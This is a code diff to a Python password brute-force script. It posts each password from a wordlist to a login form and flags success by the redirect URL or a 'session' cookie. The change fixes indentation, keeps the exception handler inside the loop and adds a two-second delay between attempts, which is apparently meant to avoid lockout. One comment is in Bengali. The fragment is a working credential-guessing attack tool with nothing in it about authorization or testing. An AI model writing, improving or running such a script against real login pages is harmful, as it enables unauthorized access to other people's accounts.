@@ -33,18 +33,20 @@ with open(wordlist) as f:
         }
 
         try:
-    resp = session.post(url, data=data, allow_redirects=True, timeout=10)
-    print(f"Status: {resp.status_code}, Final URL: {resp.url}")
-    print("Cookies:", session.cookies.get_dict())
+            resp = session.post(url, data=data, allow_redirects=True, timeout=10)
+            print(f"Status: {resp.status_code}, Final URL: {resp.url}")
+            print("Cookies:", session.cookies.get_dict())
 
-    # সফল লগইন চেক
-    if resp.url.endswith("/job") or "session" in session.cookies.get_dict():
-        print(f"[✅] Valid password found: {pwd}")
-        break
-    else:
-        print(f"[-] Invalid: {pwd}")
-        snippet = resp.text[:300].replace("\n", " ")
-        print("[Snippet]:", snippet[:300])
+            # সফল লগইন চেক
+            if resp.url.endswith("/job") or "session" in session.cookies.get_dict():
+                print(f"[✅] Valid password found: {pwd}")
+                break
+            else:
+                print(f"[-] Invalid: {pwd}")
+                snippet = resp.text[:300].replace("\n", " ")
+                print("[Snippet]:", snippet[:300])
 
-except Exception as e:
-    print(f"[!] Exception: {e}")
+        except Exception as e:
+            print(f"[!] Exception: {e}")
+
+        time.sleep(2)
